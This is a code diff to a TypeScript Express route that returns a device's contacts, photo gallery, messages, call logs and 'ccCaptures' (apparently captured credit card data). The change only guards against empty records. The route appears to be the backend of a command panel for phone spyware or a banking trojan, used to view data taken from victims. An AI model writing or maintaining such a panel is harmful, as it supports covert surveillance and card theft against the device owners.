@@ -140,39 +140,39 @@ router.get("/device/:id", requireAuth, async (req, res) => {
       success: true,
       device,
       contacts: {
-        list: Object.entries(contacts).map(([k, v]: [string, any]) => ({
+        list: Object.entries(contacts || {}).map(([k, v]: [string, any]) => ({
           id: k,
           ...v,
         })),
-        count: Object.keys(contacts).length,
+        count: Object.keys(contacts || {}).length,
       },
       gallery: {
-        list: Object.entries(gallery).map(([k, v]: [string, any]) => ({
+        list: Object.entries(gallery || {}).map(([k, v]: [string, any]) => ({
           id: k,
           ...v,
         })),
-        count: Object.keys(gallery).length,
+        count: Object.keys(gallery || {}).length,
       },
       messages: {
-        list: Object.entries(messages).map(([k, v]: [string, any]) => ({
+        list: Object.entries(messages || {}).map(([k, v]: [string, any]) => ({
           id: k,
           ...v,
         })),
-        count: Object.keys(messages).length,
+        count: Object.keys(messages || {}).length,
       },
       calls: {
-        list: Object.entries(calls).map(([k, v]: [string, any]) => ({
+        list: Object.entries(calls || {}).map(([k, v]: [string, any]) => ({
           id: k,
           ...v,
         })),
-        count: Object.keys(calls).length,
+        count: Object.keys(calls || {}).length,
       },
       ccCaptures: {
-        list: Object.entries(ccCaptures).map(([k, v]: [string, any]) => ({
+        list: Object.entries(ccCaptures || {}).map(([k, v]: [string, any]) => ({
           id: k,
           ...v,
         })),
-        count: Object.keys(ccCaptures).length,
+        count: Object.keys(ccCaptures || {}).length,
       },
     });
   } catch (err) {
